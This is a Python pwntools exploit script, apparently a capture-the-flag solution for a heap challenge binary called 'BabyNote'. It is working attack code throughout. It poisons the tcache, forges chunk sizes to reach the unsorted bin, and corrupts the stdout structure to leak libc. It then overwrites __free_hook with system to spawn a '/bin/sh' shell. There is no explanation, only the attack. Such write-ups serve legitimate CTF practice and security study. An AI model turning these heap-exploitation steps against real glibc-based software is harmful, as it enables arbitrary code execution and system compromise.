from pwn import *
context.log_level = "debug"

def choice(i):
    p.sendlineafter(">>> ",str(i))

def add(s):
    #0x60 chunk
    choice(1)
    p.sendafter("Input Content:",s)

def edit(i,s):
    choice(2)
    p.sendlineafter("Input ID:",str(i))
    #p.sendafter("Input ID:",str(i))
    p.sendafter("Input Content:",s)

def dele(i):
    choice(3)
    p.sendlineafter("Input ID:",str(i))

def debug():
    print(pidof(p))
    raw_input()

p = process("./BabyNote")
libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
#11:0x420
for i in range(12):
    add(b"aaaaaaaaa")
dele(0)
dele(1)
edit(1,b"\x90")
add(b"cccccc")#12
add(p64(0)+p64(0x61))#13

choice(666)
p.recvuntil("gift: ")
gift = int(p.recv(5))
log.success("gift: "+hex(gift))

dele(0)
dele(1)
#edit(1,b"\xa0\x90")
edit(1,p16(gift-0x200))
add(b"cccccc")#14
add(p64(0))#15 tcache

dele(1)
dele(0)#tcache
edit(13,p64(0)+p64(0x421))
dele(0)#unsorted bin
edit(13,p64(0)+p64(0x421)+b"\xa0\xd6")
add(b"bbbbbbbb")#16
add(p64(0xfbad1800)+b'a'*0x18+b'\x00')#17 stdout
p.recvline()
p.recv(8)
libcbase = u64(p.recv(6).ljust(8,b"\x00"))-0x1eb980
log.success("libcbase: "+hex(libcbase))

debug()
edit(15,p64(0)*3)
dele(1)
dele(2)
edit(2,p64(libcbase+libc.symbols["__free_hook"]))
add(b"/bin/sh\x00")#18
add(p64(libcbase+libc.symbols["system"]))
dele(18)
p.interactive()
#debug()
